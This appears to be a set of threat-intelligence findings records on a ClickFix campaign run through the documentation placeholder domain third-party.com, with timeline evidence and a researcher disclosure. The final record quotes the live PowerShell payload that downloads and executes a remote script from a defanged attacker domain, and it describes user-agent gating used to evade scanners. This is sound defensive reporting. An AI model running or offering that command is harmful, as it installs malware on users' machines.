findings.title: VirusTotal: second-stage domain elxxvvx[.]xyz distributed update2.zip in May 2026
findings.summary_md: A VirusTotal scan dated May 2, 2026, cited in BleepingComputer's reporting, shows the second-stage domain elxxvvx[.]xyz distributed a PowerShell script configured to download a 131MB zip archive from elxxvvx[.]xyz/update2.zip. The staged script is archived under hash daf619aa8cc74dab02c360f46f9f4b7b1654ba478ee89992a3512a46f1f4c209. This places the second-stage infrastructure in operation months before the September 2026 disclosure of the third-party.com lure.

findings.title: Internet Archive capture of third-party.com serving the ClickFix lure, June 15 2026
findings.summary_md: Manifold Security's disclosure links this Internet Archive capture of http://third-party.com/ as evidence the domain has served the ClickFix lure since at least June 2026. The capture timestamp embedded in the archived URL is June 15, 2026 02:33:40 UTC, making it the earliest documented malicious activity of the domain, roughly three months before the September 23, 2026 coverage.

findings.title: IPFire blocklist flagged third-party.com as malware July 7 2026, delisted July 17
findings.summary_md: Per Manifold Security, the public IPFire domain blocklist listed third-party.com as malware on July 7, 2026 and removed it on July 17, 2026, a reversal consistent with blocklist checkers using non-Windows user agents and receiving the benign decoy page. The brief listing is early third-party telemetry that the domain served malicious content by early July 2026, and direct evidence of the user-agent gating that hides the lure from scanners.

findings.title: Manifold Security disclosure: third-party.com serves Windows-only ClickFix lure
findings.summary_md: Manifold Security researchers including Ax Sharma and Swapnil Patil disclosed that third-party.com, a documentation placeholder hardcoded in over 1,500 files across 1,700+ repositories including Chromium, Sanity, and Vercel, serves a fake Cloudflare verification page only to Windows user agents. The page poisons the clipboard with powershell "Write-Host(&{iex(irm('elxxvvx[.]xyz/f'))})2>$null" dressed as a captcha token, while macOS and Linux callers get a harmless "macOS is not supported" decoy. The team reported the domain to registrar Network Solutions before publishing, and BleepingComputer credits this post as the first report.
